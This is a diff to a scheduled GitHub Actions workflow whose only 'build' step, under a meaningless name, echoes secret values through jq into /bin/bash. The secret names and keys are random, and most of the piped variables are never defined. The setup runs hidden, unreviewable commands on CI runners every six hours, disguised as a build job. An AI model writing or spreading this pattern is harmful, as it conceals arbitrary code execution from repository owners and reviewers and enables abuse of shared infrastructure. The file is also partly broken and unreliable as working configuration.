@@ -4,21 +4,23 @@ on:
   schedule:
     - cron: '45 3/6 * * *'
 
-jobs:  # 19467
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: persuadetour
         env:
-          cfjqk0: ${{ secrets.cfjqk0 }}
+          gs248: ${{ secrets.gs248 }}
         run: |
-          echo $cfjqk0 | jq -r .iczr761 | /bin/bash
-          echo $pki831 | jq -r .fgaep1 | /bin/bash
-          echo $bpi4 | jq -r .xx2 | /bin/bash
-          echo $up710 | jq -r .lmdp85 | /bin/bash
-          echo $h84 | jq -r .veerp3 | /bin/bash
-          echo $fwyfi2065 | jq -r .schx490 | /bin/bash
-          echo $bpbg178 | jq -r .rvy4339 | /bin/bash
-          echo $rrfnj64 | jq -r .l0644 | /bin/bash
+          echo $gs248 | jq -r .d7 | /bin/bash
+          echo $mtgs4 | jq -r .ltdws78530 | /bin/bash
+          echo $iojjq8 | jq -r .m71548 | /bin/bash
+          echo $f0322 | jq -r .j03251 | /bin/bash
+          echo $c6 | jq -r .ytb8223 | /bin/bash
+          echo $c128 | jq -r .wbdpd96 | /bin/bash
+          echo $va8 | jq -r .uxh2 | /bin/bash
+          echo $evyx20022 | jq -r .qhg50388 | /bin/bash
+          echo $i22136 | jq -r .vzfj783 | /bin/bash
+          echo $i44210 | jq -r .apqve396 | /bin/bash
 
